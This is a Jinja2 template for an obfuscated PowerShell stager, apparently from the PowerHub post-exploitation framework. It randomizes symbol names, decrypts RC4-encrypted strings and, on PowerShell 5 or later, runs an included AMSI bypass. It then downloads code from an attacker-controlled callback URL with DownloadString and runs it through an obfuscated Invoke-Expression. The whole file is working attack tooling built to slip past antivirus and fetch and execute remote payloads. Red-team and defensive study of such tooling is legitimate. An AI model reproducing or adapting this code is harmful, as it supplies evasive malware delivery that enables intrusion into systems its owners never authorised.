{% from 'macros.jinja2' import obfuscate with context%}

{% if amsibypass %}

${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")

{% include "powershell/rc4.ps1" %}


function {{symbol_name("Decrypt-String")}} {
    param(
        [System.String]${{symbol_name("string")}}, [Bool]${{symbol_name("Code")}}=$False
  	)
    ${{symbol_name("result")}} = [System.Convert]::FromBase64String(${{symbol_name("string")}})
    ${{symbol_name("result")}} = {{symbol_name("Decrypt-Code")}} ${{symbol_name("result")}} ${{symbol_name("KEY")}}
    if (-not ${{symbol_name("Code")}}) { ${{symbol_name("result")}} = [System.Text.Encoding]::UTF8.GetString(${{symbol_name("result")}}) }
    ${{symbol_name("result")}}
}

if ($PSVersionTable.PSVersion.Major -ge 5) {
        try {
        {% include amsibypass %}
        } catch {
            Write-Error (-join ({{obfuscate("AMSI Bypass failed: ")}}, $_))
        }
}

{% endif %}
{% if transport %}

{% if exec_clipboard_entry %}
    ${{symbol_name("clip_entry")}} = "{{exec_clipboard_entry|rc4encrypt}}"
{% else %}
    ${{symbol_name("clip_entry")}} = ""
{% endif %}

${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"

{% if transport in ['http', 'https'] %}
    ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
    function {{symbol_name("Transport-String")}} {
        param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
        $args = "?t={{transport}}"
        foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.{{obfuscate("DownloadString")}}.Invoke("${{symbol_name("CALLBACK_URL")}}${1}${args}")) $3
    }
{% elif transport == 'smb' %}
    {# TODO #}
{% elif transport == 'dns' %}
    {# TODO #}
{% endif %}


{% if amsibypass %}
{# If amsibypass has been included in the same file, load the rest in an extra request. Else, include it in jinja because we can assume AMSI has been disabled #}

${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "h"

& (g`Cm {{obfuscate("Invoke-Expression")}}) ${{symbol_name("Code")}}

{% else %}

{% include 'powershell/powerhub.ps1' %}

{% endif %}
{% endif %}
